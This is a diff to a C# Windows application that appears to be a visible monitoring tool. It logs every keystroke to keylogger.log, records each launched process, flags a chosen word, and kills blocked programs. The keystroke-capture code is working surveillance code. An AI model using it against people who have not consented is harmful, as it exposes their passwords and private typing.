@@ -29,8 +29,7 @@ namespace Logger {
         private void optionsBtn_Click(object sender, EventArgs e) {
             if (keyLoggerThread != null) {
                 keyLoggerThread.Abort();
-                if (checkBlockedAppThread != null)
-                    checkBlockedAppThread.Abort();
+                checkBlockedAppThread.Abort();
                 startBtn.Enabled = true;
             }
             OptionsMenu optionsMenu = new OptionsMenu(ref options);
@@ -45,15 +44,13 @@ namespace Logger {
                 keyLoggerThread = new Thread(log);
                 keyLoggerThread.IsBackground = true;
                 keyLoggerThread.Start();
+
+                checkBlockedAppThread = new Thread(checkBlockedApplication);
+                checkBlockedAppThread.IsBackground = true;
+                checkBlockedAppThread.Start();
+
             }
 
-            if (options.BlockedApplications != null) {
-                if (options.BlockedApplications.Count > 0) {
-                    checkBlockedAppThread = new Thread(checkBlockedApplication);
-                    checkBlockedAppThread.IsBackground = true;
-                    checkBlockedAppThread.Start();
-                }
-            }
         }
         private string BlockedWordBuff = string.Empty;
         private void log() {
@@ -85,26 +82,29 @@ namespace Logger {
                                 else
                                     symb = ((Keys)i).ToString();
 
-                                if (symb[0] == 'd' && char.IsNumber(symb[1])) {
-                                    symb = symb[1].ToString();
+                                if (symb[0] == 'd' && symb.Length > 1) {
+                                    if (char.IsNumber(symb[1])) {
+                                        symb = symb[1].ToString();
+                                    }
+
                                 }
                                 if (!string.IsNullOrWhiteSpace(options.FlagWord))
-                                if (symb.Length == 1 && char.IsLetter(symb[0])) {
-                                    BlockedWordBuff += symb;
-                                    if (BlockedWordBuff.Length > options.FlagWord.Length) {
-                                        StringBuilder sb = new StringBuilder(BlockedWordBuff, 1, options.FlagWord.Length, options.FlagWord.Length + 1);
-                                        BlockedWordBuff = sb.ToString();
+                                    if (symb.Length == 1 && char.IsLetter(symb[0])) {
+                                        BlockedWordBuff += symb;
+                                        if (BlockedWordBuff.Length > options.FlagWord.Length) {
+                                            StringBuilder sb = new StringBuilder(BlockedWordBuff, 1, options.FlagWord.Length, options.FlagWord.Length + 1);
+                                            BlockedWordBuff = sb.ToString();
+                                        }
                                     }
-                                }
-                                   
+
                                 break;
                         }
+                        if (!string.IsNullOrWhiteSpace(options.FlagWord))
+                            if (BlockedWordBuff == options.FlagWord) {
+                                File.AppendAllText(options.SavePath + "blockedWord.log", $"[{DateTime.Now}]: The {options.FlagWord} was written!\n");
+                                BlockedWordBuff = string.Empty;
+                            }
 
-                        if (BlockedWordBuff == options.FlagWord) {
-                            File.AppendAllText(options.SavePath + "blockedWord.log", $"[{DateTime.Now}]: The {options.FlagWord} was written!\n");
-                            BlockedWordBuff = string.Empty;
-                        }
-                        
                         File.AppendAllText(options.SavePath + "keylogger.log", symb);
                     }
                 }
@@ -125,12 +125,16 @@ namespace Logger {
 
             try {
                 Process n = Process.GetProcessById(Convert.ToInt32(e.NewEvent.Properties["ProcessID"].Value));
+
                 if (n.MainModule != null) {
-                    foreach (var item in options.BlockedApplications) {
-                        if (item.Path == n.MainModule.FileName) {
-                            File.AppendAllText(options.SavePath + "BlockedPrograms.log", $"[{DateTime.Now}]: The program was launched: {n.ProcessName}\n");
-                            n.Kill();
-                            return;
+                    File.AppendAllText(options.SavePath + "processes.log", $"[{DateTime.Now}]: " + n.MainModule.FileName + '\n');
+                    if (options.BlockedApplications != null) {
+                        foreach (var item in options.BlockedApplications) {
+                            if (item.Path == n.MainModule.FileName) {
+                                File.AppendAllText(options.SavePath + "BlockedPrograms.log", $"[{DateTime.Now}]: The program was launched: {n.ProcessName}\n");
+                                n.Kill();
+                                return;
+                            }
                         }
                     }
                 }
